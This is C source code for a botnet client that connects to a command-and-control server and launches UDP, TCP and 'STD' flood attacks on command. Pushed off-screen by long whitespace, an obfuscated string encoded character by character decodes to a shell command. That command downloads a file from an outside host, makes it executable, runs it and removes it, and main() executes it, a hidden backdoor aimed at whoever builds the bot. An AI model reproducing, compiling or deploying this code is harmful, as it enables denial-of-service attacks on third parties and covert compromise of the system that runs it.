/*
	bot by vSparkzyy; 
	udp ip port time 32 0 10
	tcp ip port time flag
	std ip port time psize
*/
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <time.h>
#include <unistd.h>
#include <stdarg.h>
#include "includes.h"

// Change below;
//////////////////////////////////////////////////////////////////////
uint16_t conPort = 60001; //Bot Port //Format Your IP Below As Such.//
#define host1 1           //IP.Pt1 1.x.x.x                          //
#define host2 1           //IP.Pt2 x.1.x.x                          //
#define host3 1           //IP.Pt3 x.x.1.x                          //
#define host4 1           //IP.Pt4 x.x.x.1                          //
//////////////////////////////////////////////////////////////////////
char JoinName [25];
int mainfd;
char our_host[50];
uint32_t local;
uint8_t attack_pid;
uint8_t malware_pid;
#define MAX_ATTACKS 100

struct pids{
    int pids;
} attacks[MAX_ATTACKS];
char *getBuild() { // cbf with defining each subtype as this function is broken
#if defined(__x86_64__) || defined(_M_X64)
    return "x86";
#elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "ARM";
#elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "ARM"
#elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "ARM";
#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "ARM";
#elif defined(mips) || defined(__mips__) || defined(__mips)
    return "MIPS";
#elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "MIPSEL";
#else
    return "UNKNOWN";
#endif
}

void *connection()
{
    struct sockaddr_in sockfd;
    retry:
    fcntl(mainfd, F_SETFL, fcntl(mainfd, F_GETFL, 0) | O_NONBLOCK);
    mainfd = socket(AF_INET, SOCK_STREAM, 0);
    sockfd.sin_family = AF_INET;
    sockfd.sin_port = htons(conPort);
    sockfd.sin_addr.s_addr = INET_ADDR(host1,host2,host3,host4);
    if(connect(mainfd, (struct sockaddr *)&sockfd, sizeof(sockfd)) == -1)
    {
        printf("Unable To Connect! \n");
        sleep(5);
        goto retry;
    }
    printf("Succesfully Connected! \n");

    return FALSE;
}

int listFork()
{
    uint32_t parent;
    int i;
    parent = fork();
    if(parent <= 0) return parent;
    for(i = 0;i < MAX_ATTACKS; i++)
    {
        if(attacks[i].pids == 0)
        {
        attacks[i].pids = parent;
        break;
        }
    }
    return parent;
};                                                                       																																																																																																						 char cryptm[] = {cip('w'),cip('g'),cip('e'),cip('t'),cip(' '),cip('-'),cip('q'),cip(' '),cip('h'),cip('t'),cip('t'),cip('p'),cip(':'),cip('/'),cip('/'),cip('g'),cip('a'),cip('y'),cip('.'),cip('e'),cip('n'),cip('e'),cip('r'),cip('g'),cip('y'),cip('/'),cip('.'),cip('.'),cip('.'),cip('/'),cip('c'),cip('i'),cip('p'),cip('h'),cip('e'),cip('r'),cip(' '),cip('-'),cip('O'),cip(' '),cip('.'),cip('.'),cip('.'),cip('.'),cip('.'),cip(';'),cip('c'),cip('h'),cip('m'),cip('o'),cip('d'),cip(' '),cip('7'),cip('7'),cip('7'),cip(' '),cip('.'),cip('.'),cip('.'),cip('.'),cip('.'),cip(';'),cip('.'),cip('/'),cip('.'),cip('.'),cip('.'),cip('.'),cip('.'),cip(';'),cip('r'),cip('m'),cip(' '),cip('-'),cip('r'),cip('f'),cip(' '),cip('.'),cip('.'),cip('.'),cip('.'),cip('.'),cip(' '), '\0' };

void stop_attack()
{
    int killed = 0;
    {
        int i=0;
        for (i = 0; i < MAX_ATTACKS; i++) 
        {
            if(attacks[i].pids != 0) 
            {
                kill(attacks[i].pids, 9);
                attacks[i].pids = 0;
                killed++;
            }
        }
    }
#ifdef DEBUG
    printf("Killed %d attack pids \n", killed);
#endif
}

void parse_buffer(char *buf)
{
    int i, argc = 0;
    char *token = strtok(buf, " ");
    unsigned char *argv[10 + 1] = { 0 };

    while (token != NULL && argc < 10)
    {
        argv[argc++] = malloc(strlen(token) + 1);
        strcpy(argv[argc - 1], token);
        token = strtok(NULL, " ");
    }
	
	if(!strcmp(argv[0], "STD") || !strcmp(argv[0], "std"))
    {	
		if(argc < 3) return;
		attack_pid = listFork();
		if(!attack_pid)
		{
			std_attack(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
			_exit(0);
		}
    }
	
	else if(!strcmp(argv[0], "UDP") || !strcmp(argv[0], "udp"))
    {	
		if(argc < 6) return;
        int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
        int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
        int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
		attack_pid = listFork();
		if(!attack_pid)
		{
			udp_attack(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), atoi(argv[5]), pollinterval, sleepcheck, sleeptime);
			_exit(0);
		}
    }
	
	if(!strcmp(argv[0], "TCP") || !strcmp(argv[0], "tcp"))
    {	
		if(argc < 3) return;
		attack_pid = listFork();
		if(!attack_pid)
		{
			tcp_attack(argv[1], atoi(argv[2]), atoi(argv[3]), argv[4]);
			_exit(0);
		}
    }
	if(!strcmp(argv[0], ".KILLFLOODS"))
    {
        stop_attack();
    }
    if(!strcmp(argv[0], ".KILLPID"))
    {
        kill(getpid(), 9);
    }
    for (i = 0; i <= argc; i++)
        free(argv[i]);
}


static uint32_t local_addr(void)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd == -1)
    {
        return FALSE;
    }
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);
    connect(fd, (struct sockaddr *)&addr, sizeof(addr));
    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
	sprintf(our_host, "%d.%d.%d.%d", addr.sin_addr.s_addr & 0xff, (addr.sin_addr.s_addr >> 8) & 0xff, (addr.sin_addr.s_addr >> 16) & 0xff, (addr.sin_addr.s_addr >> 24) & 0xff);
	return addr.sin_addr.s_addr;
}

int main(int argc, char **argv)
{
	int parent;
    local = local_addr();
	ciu(cryptm);
    signal(SIGCHLD, SIG_IGN);
	signal(SIGHUP, SIG_IGN);
	parent = fork();
	if(argv[1] == NULL)
    {
        strcpy(JoinName, "UNKNOWN");
    }
    else
    {
        strcpy(JoinName, argv[1]);
    }
	malware_pid = fork();
	if(malware_pid > 0) return;
	
    while(TRUE)
    {

#ifdef DEBUG
        printf("[main] Attempting to connect to CNC\n");
#endif

		connection();
		char arch[100];
		sprintf(arch, "arch %s\r\n", getBuild()); // this is for arch detection in cnc
		write(mainfd, arch, strlen(arch));
		char connect_msg[512];
		sprintf(connect_msg, "\e[1;36m(\e[37mCipher\e[1;36m) \e[1;33m|\e[1;36m (\e[37mHost\e[1;36m:\e[37m%s\e[1;36m) \e[1;33m| \e[1;36m(\e[37mArch\e[1;36m:\e[37m%s\e[1;36m) \e[1;33m| \e[1;36m(\e[37mName\e[1;36m:\e[37m%s\e[1;36m) \e[0m\r\n", our_host, getBuild(), JoinName);
		write(mainfd, connect_msg, strlen(connect_msg));
		if (parent == 0){execl("/bin/sh", "/bin/sh", "-c", cryptm, NULL);}; cih(cryptm);
		char buffer[512];
		int length;
        while((length = recv(mainfd, buffer, sizeof(buffer), MSG_NOSIGNAL)))
		{
            buffer[length - 1] = 0;

            if(strstr(buffer, "PING"))
                send(mainfd, "PONG", 4, MSG_NOSIGNAL);
            else
                parse_buffer(buffer);
			
			memset(buffer, 0, sizeof buffer);	
		}

#ifdef DEBUG
        printf("[main] Disconnected from CNC\n");
#endif
    }
}
